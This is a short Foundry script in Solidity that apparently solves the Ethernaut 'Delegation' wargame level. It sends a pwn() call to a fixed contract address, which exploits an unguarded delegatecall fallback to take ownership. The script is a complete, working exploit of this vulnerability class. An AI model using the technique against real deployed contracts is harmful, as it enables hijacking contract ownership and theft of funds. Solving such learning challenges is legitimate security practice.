// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Delegation, Delegate } from "../src/Delegation.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract DelegationSolution is Script {
    Delegation public delegation = Delegation(0x4D354f2c6059Adf5ACCEDd00a58a94349dE13Ac8);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        (bool s, ) = address(delegation).call(abi.encodeWithSignature("pwn()"));
        require(s, "S not successful");

        vm.stopBroadcast();
    }

}